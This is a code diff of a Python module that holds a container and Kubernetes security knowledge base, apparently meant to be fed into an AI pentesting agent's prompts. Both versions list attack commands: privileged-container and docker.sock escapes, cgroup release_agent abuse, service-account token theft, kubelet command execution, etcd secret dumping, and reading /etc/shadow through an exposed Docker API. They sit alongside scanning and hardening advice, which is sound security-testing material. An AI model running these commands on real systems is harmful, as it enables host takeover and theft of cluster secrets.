@@ -1,11 +1,11 @@
-"""Container and Docker security knowledge base.
+"""Container security knowledge base.
 
-Deep knowledge about container vulnerabilities:
-1. Docker breakout and escape
-2. Kubernetes pod security
-3. Container runtime attacks
-4. Image security and supply chain
-5. Orchestration platform attacks
+Deep knowledge about container and Kubernetes security:
+1. Docker escape techniques
+2. Kubernetes cluster attacks
+3. Container image vulnerabilities
+4. Runtime security
+5. Service mesh and network policy
 """
 
 from __future__ import annotations
@@ -24,7 +24,7 @@ class ContainerPattern:
     pattern_id: str = ""
     name: str = ""
     category: str = ""
-    severity: str = "high"
+    severity: str = "critical"
     description: str = ""
     detection_strategy: str = ""
     tools: list[str] = field(default_factory=list)
@@ -39,184 +39,208 @@ class ContainerPattern:
 
 CONTAINER_PATTERNS: list[dict[str, Any]] = [
     {
-        "id": "ct-001", "name": "Docker Container Escape",
+        "id": "cont-001", "name": "Docker Escape",
         "category": "escape", "severity": "critical",
-        "desc": "Techniques for escaping from Docker containers.",
+        "desc": "Docker container escape techniques.",
         "detection": (
-            "DOCKER CONTAINER ESCAPE:\n"
-            "PRIVILEGED MODE:\n"
-            "  # Check if running privileged\n"
-            "  cat /proc/1/status | grep CapEff\n"
-            "  # CapEff: 0000003fffffffff = privileged\n"
-            "  # Mount host filesystem\n"
-            "  mkdir /tmp/host && mount /dev/sda1 /tmp/host\n"
-            "  # Access host via chroot\n"
-            "  chroot /tmp/host\n"
+            "DOCKER ESCAPE:\n"
+            "PRIVILEGED CONTAINER:\n"
+            "  # Check: docker inspect | grep Privileged\n"
+            "  # Full host access if privileged=true\n"
+            "  mount /dev/sda1 /mnt  # Mount host filesystem\n"
+            "  chroot /mnt  # Escape to host\n"
+            "  nsenter --target 1 --mount --uts --ipc --net --pid  # Enter host namespaces\n"
+            "DANGEROUS CAPABILITIES:\n"
+            "  # SYS_ADMIN: mount, sysctl, etc.\n"
+            "  # SYS_PTRACE: Process injection\n"
+            "  # NET_ADMIN: Network manipulation\n"
+            "  # DAC_READ_SEARCH: Read any file\n"
+            "  capsh --print  # Check capabilities\n"
             "DOCKER SOCKET:\n"
-            "  # Check for mounted socket\n"
-            "  ls -la /var/run/docker.sock\n"
-            "  # If accessible, spawn privileged container\n"
-            "  curl --unix-socket /var/run/docker.sock \\\n"
-            "    http://localhost/containers/json\n"
-            "  # Create and start privileged container\n"
-            "  docker run -v /:/host --privileged -it alpine chroot /host\n"
-            "CGROUPS ESCAPE (CVE-2022-0492):\n"
-            "  # Abuse cgroup release_agent\n"
-            "  # Requires CAP_SYS_ADMIN inside container\n"
-            "  mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp\n"
-            "  mkdir /tmp/cgrp/x\n"
-            "  echo 1 > /tmp/cgrp/x/notify_on_release\n"
-            "  host_path=$(sed -n 's/.*upperdir=\\([^,]*\\).*/\\1/p' /etc/mtab)\n"
-            "  echo \"$host_path/cmd\" > /tmp/cgrp/release_agent\n"
-            "KERNEL EXPLOIT:\n"
-            "  - Dirty Pipe (CVE-2022-0847)\n"
-            "  - Dirty COW (CVE-2016-5195)\n"
-            "  - Container host shares kernel"
-        ),
-        "tools": ["docker", "deepce"],
-    },
-    {
-        "id": "ct-002", "name": "Kubernetes Pod Security",
-        "category": "k8s_pod", "severity": "high",
-        "desc": "Kubernetes pod-level security assessment.",
-        "detection": (
-            "KUBERNETES POD SECURITY:\n"
-            "SERVICE ACCOUNT TOKENS:\n"
-            "  # Check for mounted SA token\n"
-            "  cat /var/run/secrets/kubernetes.io/serviceaccount/token\n"
-            "  # Use token to query API\n"
-            "  APISERVER=https://kubernetes.default.svc\n"
-            "  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\n"
-            "  curl -sk $APISERVER/api/v1/namespaces/default/pods \\\n"
-            "    -H \"Authorization: Bearer $TOKEN\"\n"
-            "POD SECURITY STANDARDS:\n"
-            "  # Check for violations\n"
-            "  - Privileged containers\n"
-            "  - hostPID, hostNetwork, hostIPC\n"
-            "  - Capabilities: NET_RAW, SYS_ADMIN, SYS_PTRACE\n"
-            "  - Writable root filesystem\n"
-            "  - Run as root (UID 0)\n"
-            "  - Privileged escalation (allowPrivilegeEscalation: true)\n"
-            "TOOLS:\n"
-            "  # kube-bench (CIS benchmark)\n"
-            "  kube-bench run --targets node\n"
-            "  # kubeaudit\n"
-            "  kubeaudit all\n"
-            "  # kubectl\n"
-            "  kubectl auth can-i --list  # Check permissions\n"
-            "  kubectl get pods -A  # All namespaces\n"
-            "  kubectl get secrets -A  # All secrets"
-        ),
-        "tools": ["kubectl", "kube-bench", "kubeaudit"],
-    },
-    {
-        "id": "ct-003", "name": "Container Runtime Attacks",
-        "category": "runtime", "severity": "critical",
-        "desc": "Attacks against container runtimes (Docker, containerd, CRI-O).",
-        "detection": (
-            "CONTAINER RUNTIME ATTACKS:\n"
-            "DOCKER DAEMON:\n"
-            "  - Exposed Docker API (port 2375/2376)\n"
-            "  curl http://<target>:2375/version\n"
-            "  curl http://<target>:2375/containers/json\n"
-            "  # Remote code execution via exposed API\n"
-            "  docker -H tcp://<target>:2375 run -v /:/mnt alpine cat /mnt/etc/shadow\n"
-            "CONTAINERD:\n"
-            "  - Exposed containerd socket\n"
-            "  - ctr (containerd CLI) access\n"
-            "  ctr -a /run/containerd/containerd.sock containers list\n"
-            "RUNC VULNERABILITIES:\n"
-            "  - CVE-2019-5736: runc container escape\n"
-            "  - Overwrites host runc binary\n"
-            "  - Triggered when exec into container\n"
-            "PROC ESCAPE:\n"
-            "  - /proc/sysrq-trigger accessible\n"
-            "  - /proc/kcore readable\n"
-            "  - /proc/kmsg readable\n"
-            "  - /sys/firmware accessible\n"
+            "  # If /var/run/docker.sock is mounted\n"
+            "  docker -H unix:///var/run/docker.sock run -it --privileged --pid=host ubuntu bash\n"
+            "  # Full host control via Docker API\n"
+            "CGROUP ESCAPE:\n"
+            "  # CVE-2022-0492: Unshare + mount cgroup\n"
+            "  # Release_agent exploitation\n"
+            "RUNC ESCAPE:\n"
+            "  # CVE-2024-21626 (Leaky Vessels)\n"
+            "  # CVE-2019-5736 (runc overwrite)\n"
+            "KERNEL EXPLOITS:\n"
+            "  # Container shares host kernel\n"
+            "  # Dirty Pipe, Dirty COW, etc.\n"
             "DETECTION:\n"
-            "  deepce.sh  # Docker enumeration tool\n"
-            "  amicontained  # Check container restrictions\n"
-            "  # Check capabilities\n"
-            "  capsh --print"
+            "  cat /proc/1/cgroup  # Am I in a container?\n"
+            "  ls /.dockerenv  # Docker indicator\n"
+            "  mount | grep docker  # Check mounts"
         ),
-        "tools": ["deepce", "amicontained"],
+        "tools": ["deepce", "cdkexec"],
     },
     {
-        "id": "ct-004", "name": "Container Network Security",
-        "category": "network", "severity": "high",
-        "desc": "Container network segmentation and security.",
+        "id": "cont-002", "name": "Kubernetes Attacks",
+        "category": "k8s", "severity": "critical",
+        "desc": "Kubernetes cluster attack techniques.",
         "detection": (
-            "CONTAINER NETWORK SECURITY:\n"
-            "NETWORK POLICIES:\n"
-            "  # Check if NetworkPolicies exist\n"
-            "  kubectl get networkpolicies -A\n"
-            "  # Default: all pods can communicate\n"
-            "  # Test cross-namespace communication\n"
-            "  kubectl exec -it <pod> -- curl <target-service>\n"
-            "DOCKER NETWORKING:\n"
-            "  - Bridge mode: containers share bridge\n"
-            "  - Host mode: container uses host network stack\n"
-            "  - ARP spoofing between containers\n"
-            "  - DNS spoofing on Docker internal DNS\n"
-            "  # Check container network mode\n"
-            "  docker inspect <container> | grep NetworkMode\n"
-            "SERVICE MESH:\n"
-            "  - Istio/Linkerd mTLS enforcement\n"
-            "  - Sidecar injection verification\n"
-            "  - Check for plaintext communication\n"
-            "  - Envoy proxy misconfiguration\n"
-            "METADATA SERVICE:\n"
-            "  # Cloud metadata from container\n"
-            "  curl http://169.254.169.254/latest/meta-data/\n"
-            "  # GKE metadata\n"
-            "  curl -H 'Metadata-Flavor: Google' http://169.254.169.254/\n"
-            "  # Block with NetworkPolicy or IMDSv2"
-        ),
-        "tools": ["kubectl", "nmap"],
-    },
-    {
-        "id": "ct-005", "name": "Container Secret Management",
-        "category": "secrets", "severity": "critical",
-        "desc": "Container and orchestration secret exposure.",
-        "detection": (
-            "CONTAINER SECRET MANAGEMENT:\n"
-            "KUBERNETES SECRETS:\n"
-            "  # List secrets\n"
-            "  kubectl get secrets -A\n"
-            "  # Decode secret (base64)\n"
-            "  kubectl get secret <name> -o jsonpath='{.data}'\n"
-            "  echo '<base64>' | base64 -d\n"
-            "  # Secrets in env vars\n"
-            "  kubectl exec <pod> -- env | grep -i pass\n"
-            "  # Secrets in volumes\n"
-            "  kubectl exec <pod> -- ls /var/run/secrets/\n"
-            "DOCKER SECRETS:\n"
-            "  # Environment variables\n"
-            "  docker inspect <container> | grep -i env\n"
-            "  # Docker secrets (Swarm)\n"
-            "  docker secret ls\n"
-            "  # .env files in image layers\n"
-            "  docker history <image> --no-trunc\n"
+            "KUBERNETES ATTACKS:\n"
+            "RBAC EXPLOITATION:\n"
+            "  kubectl auth can-i --list  # Check permissions\n"
+            "  # Overly permissive: * verbs on * resources\n"
+            "  # Service account token: /var/run/secrets/kubernetes.io/serviceaccount/token\n"
+            "  # Access API server with SA token\n"
+            "POD ESCAPE:\n"
+            "  # hostPID: true → See host processes\n"
+            "  # hostNetwork: true → Host network access\n"
+            "  # hostPath: Mount host filesystem\n"
+            "  # privileged: true → Full host access\n"
             "ETCD:\n"
-            "  # If etcd exposed (port 2379)\n"
-            "  etcdctl get / --prefix --keys-only\n"
-            "  etcdctl get /registry/secrets/default/<name>\n"
-            "VAULT INTEGRATION:\n"
-            "  - Check Vault agent sidecar\n"
-            "  - Verify token rotation\n"
-            "  - Check for hardcoded Vault tokens\n"
-            "  - Review Vault policies"
+            "  # etcd stores all cluster state/secrets\n"
+            "  etcdctl get --prefix /registry/secrets/\n"
+            "  # Often unencrypted, accessible if misconfigured\n"
+            "KUBELET API:\n"
+            "  # Port 10250 (kubelet)\n"
+            "  curl https://<node>:10250/pods/\n"
+            "  curl https://<node>:10250/run/<namespace>/<pod>/<container> -d 'cmd=id'\n"
+            "  # If anonymous auth enabled → RCE on any pod\n"
+            "SERVICE ACCOUNT ABUSE:\n"
+            "  # Default SA often has excessive permissions\n"
+            "  # Mount custom SA token in pod\n"
+            "  # Lateral movement via SA tokens\n"
+            "METADATA API:\n"
+            "  curl http://169.254.169.254/latest/meta-data/  # From pod\n"
+            "  # Cloud provider IAM roles\n"
+            "TOOLS:\n"
+            "  kube-hunter  # K8s penetration testing\n"
+            "  kubeaudit  # Security auditing\n"
+            "  peirates  # K8s penetration testing\n"
+            "  kubectl-who-can  # RBAC analysis"
         ),
-        "tools": ["kubectl", "etcdctl"],
+        "tools": ["kube-hunter", "kubeaudit", "peirates"],
+    },
+    {
+        "id": "cont-003", "name": "Image Vulnerabilities",
+        "category": "image", "severity": "high",
+        "desc": "Container image vulnerability analysis.",
+        "detection": (
+            "IMAGE VULNERABILITIES:\n"
+            "SCANNING:\n"
+            "  trivy image <image>  # Comprehensive scanner\n"
+            "  grype <image>  # Anchore vulnerability scanner\n"
+            "  snyk container test <image>  # Snyk scanner\n"
+            "  docker scout cves <image>  # Docker Scout\n"
+            "COMMON ISSUES:\n"
+            "  - Outdated base images (Ubuntu, Alpine)\n"
+            "  - Known CVEs in packages\n"
+            "  - Hardcoded secrets in layers\n"
+            "  - Running as root\n"
+            "  - Unnecessary packages installed\n"
+            "LAYER ANALYSIS:\n"
+            "  dive <image>  # Explore image layers\n"
+            "  docker history <image>  # Layer history\n"
+            "  # Extract secrets from intermediate layers\n"
+            "  docker save <image> | tar -xf -\n"
+            "  # Search each layer for credentials\n"
+            "SUPPLY CHAIN:\n"
+            "  - Typosquatting on Docker Hub\n"
+            "  - Compromised base images\n"
+            "  - Build pipeline injection\n"
+            "  - Unsigned images\n"
+            "  cosign verify <image>  # Verify signatures\n"
+            "  # Content trust: DOCKER_CONTENT_TRUST=1\n"
+            "BEST PRACTICES:\n"
+            "  - Use minimal base (distroless, scratch)\n"
+            "  - Multi-stage builds\n"
+            "  - No secrets in Dockerfile\n"
+            "  - Non-root user\n"
+            "  - Read-only filesystem"
+        ),
+        "tools": ["trivy", "grype", "dive"],
+    },
+    {
+        "id": "cont-004", "name": "Runtime Security",
+        "category": "runtime", "severity": "high",
+        "desc": "Container runtime security monitoring.",
+        "detection": (
+            "RUNTIME SECURITY:\n"
+            "SYSCALL MONITORING:\n"
+            "  # Falco: Runtime security monitoring\n"
+            "  falco  # Detect abnormal behavior\n"
+            "  # Rules: shell in container, crypto mining, etc.\n"
+            "  # Custom rules for specific threats\n"
+            "SECCOMP:\n"
+            "  # Restrict syscalls available to container\n"
+            "  # Default profile blocks dangerous syscalls\n"
+            "  # Custom profiles for specific workloads\n"
+            "  docker run --security-opt seccomp=profile.json\n"
+            "APPARMOR / SELINUX:\n"
+            "  # Mandatory access control\n"
+            "  # AppArmor profiles restrict container actions\n"
+            "  docker run --security-opt apparmor=profile\n"
+            "READ-ONLY FILESYSTEM:\n"
+            "  docker run --read-only\n"
+            "  # Prevents file writes (malware, web shells)\n"
+            "  # Use tmpfs for writable dirs\n"
+            "NETWORK POLICIES:\n"
+            "  # Kubernetes NetworkPolicy\n"
+            "  # Default deny all ingress/egress\n"
+            "  # Whitelist specific pod communication\n"
+            "  # Calico, Cilium for advanced policies\n"
+            "POD SECURITY:\n"
+            "  # Pod Security Standards (Restricted/Baseline/Privileged)\n"
+            "  # Pod Security Admission (PSA)\n"
+            "  # OPA Gatekeeper / Kyverno for policy\n"
+            "DETECTION:\n"
+            "  # Falco alerts\n"
+            "  # Audit logging (kube-apiserver)\n"
+            "  # Container drift detection"
+        ),
+        "tools": ["falco", "trivy"],
+    },
+    {
+        "id": "cont-005", "name": "Container Network Attacks",
+        "category": "network", "severity": "high",
+        "desc": "Container networking exploitation.",
+        "detection": (
+            "CONTAINER NETWORK ATTACKS:\n"
+            "INTERNAL NETWORK:\n"
+            "  # Docker default bridge: 172.17.0.0/16\n"
+            "  # K8s pod network: 10.244.0.0/16 (default)\n"
+            "  # Service network: 10.96.0.0/12 (default)\n"
+            "  # All pods can communicate by default (no NetworkPolicy)\n"
+            "SERVICE DISCOVERY:\n"
+            "  # DNS: <service>.<namespace>.svc.cluster.local\n"
+            "  # Environment variables: <SERVICE>_SERVICE_HOST\n"
+            "  # CoreDNS enumeration\n"
+            "  nslookup kubernetes.default.svc.cluster.local\n"
+            "  # Enumerate services in namespace\n"
+            "TRAFFIC INTERCEPTION:\n"
+            "  # ARP spoofing in pod network\n"
+            "  # DNS spoofing via CoreDNS manipulation\n"
+            "  # Man-in-the-middle on service mesh\n"
+            "  # Sidecar injection (Istio, Linkerd)\n"
+            "INGRESS ATTACKS:\n"
+            "  # Ingress controller vulnerabilities\n"
+            "  # nginx ingress misconfigurations\n"
+            "  # TLS termination issues\n"
+            "  # Host header injection\n"
+            "  # Path traversal in routing\n"
+            "CLOUD METADATA:\n"
+            "  # Access cloud provider metadata from pods\n"
+            "  # IMDSv1 vs IMDSv2 (hop limit)\n"
+            "  # AWS IRSA, GKE Workload Identity\n"
+            "TOOLS:\n"
+            "  kubeshark  # K8s network traffic viewer\n"
+            "  cilium  # eBPF-based networking\n"
+            "  netassert  # Network policy testing"
+        ),
+        "tools": ["kubeshark", "cilium"],
     },
 ]
 
 
 class ContainerSecurityKB:
-    """Container and Docker security knowledge base.
+    """Container security knowledge base.
 
-    Provides container vulnerability patterns
+    Provides container/K8s security patterns
     injected into agent prompts.
     """
 
@@ -232,7 +256,7 @@ class ContainerSecurityKB:
                 pattern_id=data["id"],
                 name=data["name"],
                 category=data.get("category", ""),
-                severity=data.get("severity", "high"),
+                severity=data.get("severity", "critical"),
                 description=data.get("desc", ""),
                 detection_strategy=data.get("detection", ""),
                 tools=data.get("tools", []),
